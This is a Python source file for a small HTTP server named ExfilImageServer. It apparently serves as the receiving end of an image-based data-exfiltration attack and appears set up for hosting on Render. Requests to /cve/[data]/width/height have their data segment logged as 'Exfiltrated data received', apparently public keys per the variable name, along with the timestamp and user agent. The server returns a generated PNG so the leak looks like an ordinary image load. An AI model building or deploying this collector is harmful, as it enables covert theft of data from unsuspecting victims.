from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote
import os
import time
from io import BytesIO
from PIL import Image

class ExfilImageServer(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parts = unquote(self.path).split('/')
            
            if self.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'Server is running. Use /cve/[data]/width/height')
                return

            if len(parts) >= 4 and parts[1] == 'cve':
                cle_pub = parts[2]
                width = parts[3] if len(parts) > 3 else "500"
                height = parts[4] if len(parts) > 4 else "300"

                self.log_message("[!] Exfiltrated data received:")
                self.log_message("    Timestamp: %s", time.strftime('%Y-%m-%d %H:%M:%S'))
                self.log_message("    Data: %s", cle_pub)
                self.log_message("    Dimensions: %sx%s", width, height)
                self.log_message("    User-Agent: %s", self.headers.get('User-Agent'))

                # Create an image dynamically
                img = Image.new("RGB", (int(width), int(height)), color=(255, 51, 255))  # white image
                buffered = BytesIO()
                img.save(buffered, format="PNG")
                
                # Send image
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(buffered.getvalue())
                return

            self.send_error(404, "Not Found - Use /cve/[data]/width/height")

        except Exception as e:
            print(f"Error handling request: {str(e)}")
            self.send_error(500, "Internal Server Error")

def run_server():
    port = int(os.environ.get('PORT', 8080))  # Render fournit le port dans l'ENV
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, ExfilImageServer)
    print(f"[*] Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
